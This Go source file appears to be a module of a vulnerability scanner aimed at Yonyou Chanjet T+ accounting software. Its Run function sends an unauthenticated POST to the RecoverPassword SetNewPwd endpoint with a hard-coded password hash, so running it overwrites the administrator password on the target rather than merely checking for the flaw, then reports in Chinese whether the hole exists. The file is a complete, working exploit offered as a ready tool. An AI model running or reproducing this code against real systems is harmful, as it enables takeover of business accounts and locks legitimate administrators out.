package T_RecoverPassword

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd"
	resp, err := client.R().
		SetHeaders(map[string]string{ // Set multiple headers at once
			"User-Agent":   UA,
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetBody("{\"pwdNew\":\"46f94c8de14fb36680850768ff1b7f2a\"}").Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞不存在")
}
